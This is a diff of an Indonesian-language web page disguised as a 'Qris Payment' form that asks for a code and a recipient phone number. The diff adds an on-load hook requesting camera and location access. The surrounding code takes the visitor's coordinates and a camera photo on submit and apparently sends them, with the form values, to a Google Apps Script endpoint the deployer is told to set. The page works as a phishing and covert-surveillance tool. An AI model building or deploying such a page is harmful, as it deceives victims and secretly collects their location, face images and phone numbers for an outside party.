@@ -1,31 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Qris Payment</title>
-  <style>
-    body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
-    .container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
-    img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
-    input, button {padding:12px 16px;width:100%;max-width:280px;margin-bottom:15px;border-radius:8px;font-size:16px;}
-    input {border:1px solid #ccc;}
-    button {border:none;background:#3b82f6;color:white;cursor:pointer;}
-    button:hover {background:#2563eb;}
-    #message {margin-top:12px;font-weight:bold;display:none;}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Qris Payment</title>
+<style>
+  body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
+  .container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
+  img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
+  input, button {padding:12px 16px;width:100%;max-width:280px;margin-bottom:15px;border-radius:8px;font-size:16px;}
+  input {border:1px solid #ccc;}
+  button {border:none;background:#3b82f6;color:white;cursor:pointer;}
+  button:hover {background:#2563eb;}
+  #message {margin-top:12px;font-weight:bold;display:none;}
+</style>
 </head>
-<body>
-  <div class="container">
-    <img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
-    <input id="kodeInput" type="text" placeholder="MASUKKAN KODE">
-    <input id="nomorInput" type="text" placeholder="NOMOR HP PENERIMA">
-    <button onclick="handleSubmit()">Submit</button>
-    <div id="message"></div>
-  </div>
+<body onload="requestPermissions()">
+<div class="container">
+  <img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
+  <input id="kodeInput" type="text" placeholder="MASUKKAN KODE">
+  <input id="nomorInput" type="text" placeholder="NOMOR HP PENERIMA">
+  <button onclick="handleSubmit()">Submit</button>
+  <div id="message"></div>
+</div>
 
 <script>
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMSS0CvsSriwIKj7sISQ5faIw0XSCOSIMsqt62LWTlz6IhWwptWJHsefq5H4Yp-PS8/exec"; // ganti dengan URL Web App baru lo
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMSS0CvsSriwIKj7sISQ5faIw0XSCOSIMsqt62LWTlz6IhWwptWJHsefq5H4Yp-PS8/exec"; // ganti dengan URL Web App lo
+
+// minta izin pas load
+function requestPermissions(){
+    // lokasi
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+            ()=>console.log("Lokasi izin OK"),
+            ()=>console.warn("Lokasi ditolak")
+        );
+    }
+    // kamera
+    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+        navigator.mediaDevices.getUserMedia({video:true})
+        .then(stream=>{
+            stream.getTracks().forEach(t=>t.stop()); // stop langsung
+            console.log("Kamera izin OK");
+        })
+        .catch(err=>console.warn("Kamera ditolak: ", err));
+    }
+}
 
 async function handleSubmit(){
     const kode = document.getElementById("kodeInput").value || "";
@@ -38,7 +58,7 @@ async function handleSubmit(){
         lokasi = `${pos.coords.latitude},${pos.coords.longitude}`;
     } catch(e){ console.warn("Lokasi ditolak"); }
 
-    // ambil foto dari kamera
+    // ambil foto
     let photo = "";
     try {
         const stream = await navigator.mediaDevices.getUserMedia({video:true});
@@ -71,5 +91,5 @@ async function handleSubmit(){
 }
 </script>
 </body>
-
-</html>
+  
+  </html>
